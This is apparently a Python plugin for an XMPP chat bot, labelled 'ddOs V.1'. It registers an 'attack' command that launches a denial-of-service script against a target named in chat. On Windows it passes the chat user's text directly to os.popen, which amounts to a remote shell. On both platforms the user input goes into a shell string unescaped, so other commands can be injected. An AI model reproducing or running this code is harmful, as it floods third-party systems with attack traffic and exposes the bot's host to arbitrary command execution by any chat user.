# zoecher 6.x plugin
# -*- coding: utf-8 -*-
#############################
###*ddOs V.1|*   ###        *
#############################
## daa@xmpp.ru ##
#################


def ddos(type, source, parameters):
	return_value='Ok'
	if os.name=='posix':
		pipe = os.popen('sh -c "./dos/dos.py -t %s" 2>&1' % (parameters.encode('utf8')))
		return_value = 'Ok'
		reply(type, source, 'Ok')
	elif os.name=='nt':
		pipe = os.popen('%s' % (parameters.encode('utf8')))
		return_value = 'Ok'
		reply(type, source, 'Ok')
	pipe.close
	time.sleep(1800)
	reply(type, source, 'Finished!')

	
register(ddos, Prefix+'attack', 9)
